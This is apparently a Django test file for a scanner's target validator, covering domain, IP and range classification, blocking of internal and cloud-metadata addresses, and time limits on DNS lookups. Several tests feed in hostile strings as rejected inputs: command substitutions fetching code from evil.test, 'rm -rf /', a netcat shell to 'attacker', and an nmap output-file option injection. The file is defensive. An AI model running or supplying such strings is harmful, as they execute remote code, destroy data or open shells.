from django.test import SimpleTestCase

from targetApp import target_types as tt


class ClassifyTargetTests(SimpleTestCase):
	def test_plain_domain_and_ip_still_classify(self):
		self.assertEqual(tt.classify_target('example.com'), tt.DOMAIN)
		self.assertEqual(tt.classify_target('sub.example.com'), tt.DOMAIN)
		self.assertEqual(tt.classify_target('203.0.113.9'), tt.IP)
		self.assertEqual(tt.classify_target('2001:db8::1'), tt.IP)
		self.assertEqual(tt.classify_target('10.0.0.0/8'), tt.CIDR)
		self.assertEqual(tt.classify_target('192.168.1.1-192.168.1.20'), tt.RANGE)
		self.assertEqual(tt.classify_target('192.168.1.1-254'), tt.RANGE)

	def test_ipv6_zone_scope_id_is_rejected(self):
		# ipaddress.ip_address() accepts this with near-arbitrary text after '%'; it must never
		# become a Domain.name (it would reach nmap/bbot/nuclei as a CLI argument).
		self.assertIsNone(tt.classify_target('fe80::1%eth0'))
		self.assertIsNone(tt.classify_target('fe80::1%$(curl evil.test|sh)'))

	def test_shell_metacharacters_are_rejected_as_domains(self):
		for bad in ('$(curl evil.test|sh)', 'evil.test; rm -rf /', 'evil.test`whoami`',
		            'evil.test|nc attacker 4444', '-oG /tmp/pwned.xml', 'a b.com', ''):
			self.assertIsNone(tt.classify_target(bad), bad)

	def test_url_credentials_style_string_is_not_a_domain(self):
		# "user@host" with no port is not a valid domain label and must not classify as one.
		self.assertIsNone(tt.classify_target('$(id)@evil.test'))

	def test_whitespace_only_or_empty_is_rejected(self):
		self.assertIsNone(tt.classify_target(''))
		self.assertIsNone(tt.classify_target('   '))
		self.assertIsNone(tt.classify_target(None))


class InternalAddressTests(SimpleTestCase):
	"""``is_internal_address``: not an address of the public internet, whatever the operator allowed scanning (issue 212)."""

	def test_private_shared_and_local_ranges_are_internal(self):
		for value in ('10.1.2.3', '172.16.0.9', '172.31.255.1', '192.168.0.5', '100.64.0.5', '127.0.0.1', '169.254.169.254', 'fd12::5', '::1',
		              'fe80::1', '224.0.0.1', '0.0.0.0'):
			self.assertTrue(tt.is_internal_address(value), value)

	def test_public_and_documentation_addresses_are_not(self):
		for value in ('8.8.8.8', '1.1.1.1', '172.15.0.1', '172.32.0.1', '203.0.113.5', '198.51.100.7', '192.0.2.1', '2606:4700::1', '2001:db8::1'):
			self.assertFalse(tt.is_internal_address(value), value)

	def test_an_ipv6_address_that_carries_an_ipv4_one_is_judged_as_that_one(self):
		self.assertTrue(tt.is_internal_address('::ffff:192.168.1.5'))
		self.assertFalse(tt.is_internal_address('::ffff:8.8.8.8'))

	def test_text_that_is_not_an_address_is_internal(self):
		for value in ('', 'example.com', None, 'not an ip'):
			self.assertTrue(tt.is_internal_address(value), value)

	def test_it_does_not_depend_on_the_opt_in_for_private_targets(self):
		import os
		from unittest import mock
		with mock.patch.dict(os.environ, {'CVENGINE_ALLOW_PRIVATE_TARGETS': '1'}):
			self.assertTrue(tt.is_scannable_ip('192.168.1.5'))
			self.assertTrue(tt.is_internal_address('192.168.1.5'))


class EmbeddedAndMetadataAddressTests(SimpleTestCase):
	def test_embedded_ipv4_forms_are_judged_by_the_address_they_reach(self):
		from targetApp.target_types import is_scannable_ip
		for blocked in ('64:ff9b::7f00:1', '64:ff9b::a9fe:a9fe', '2002:7f00:1::', '2002:a9fe:a9fe::1', '::127.0.0.1', '::ffff:7f00:1',
						'2001::1', 'fec0::1', '64:ff9b:1::1'):
			self.assertFalse(is_scannable_ip(blocked), blocked)
		self.assertTrue(is_scannable_ip('64:ff9b::808:808'))
		self.assertTrue(is_scannable_ip('2002:808:808::1'))

	def test_cloud_metadata_and_reserved_ranges_are_blocked_even_when_private_targets_are_allowed(self):
		from targetApp.target_types import is_scannable_ip
		for blocked in ('168.63.129.16', '192.0.0.192', '198.18.0.1', '240.0.0.1', '255.255.255.255', '100.100.100.200', 'fd00:ec2::254'):
			self.assertFalse(is_scannable_ip(blocked, allow_private=True), blocked)
		self.assertTrue(is_scannable_ip('10.1.2.3', allow_private=True))
		self.assertTrue(is_scannable_ip('8.8.8.8'))


class BoundedResolutionTests(SimpleTestCase):
	def test_names_are_checked_in_parallel_and_a_hung_lookup_does_not_stall_the_batch(self):
		import time
		from unittest import mock

		from targetApp import target_types

		def lookup(name):
			if name.startswith('hang'):
				time.sleep(3)
			return name.startswith('bad')

		started = time.monotonic()
		with mock.patch.object(target_types, 'resolves_to_blocked', side_effect=lookup):
			blocked = target_types.blocked_names(['bad1.example', 'ok.example'] + [f'hang{i}.example' for i in range(8)],
												 workers=4, budget=1, timeout=0.3)
		self.assertEqual(blocked, {'bad1.example'} | {f'hang{i}.example' for i in range(8)})  # unverified is not scannable
		self.assertLess(time.monotonic() - started, 2.5)

	def test_a_single_slow_lookup_gives_up_and_is_not_scannable(self):
		import time
		from unittest import mock

		from targetApp import target_types
		with mock.patch.object(target_types, '_lookup_blocked', lambda name: time.sleep(2) or False):
			started = time.monotonic()
			self.assertTrue(target_types.resolves_to_blocked('slow.example', timeout=0.2))
			self.assertLess(time.monotonic() - started, 1)

	def test_a_name_that_does_not_exist_is_not_blocked(self):
		import socket
		from unittest import mock

		from targetApp import target_types
		with mock.patch('socket.getaddrinfo', side_effect=socket.gaierror(-2, 'Name or service not known')):
			self.assertFalse(target_types.resolves_to_blocked('nope.example'))
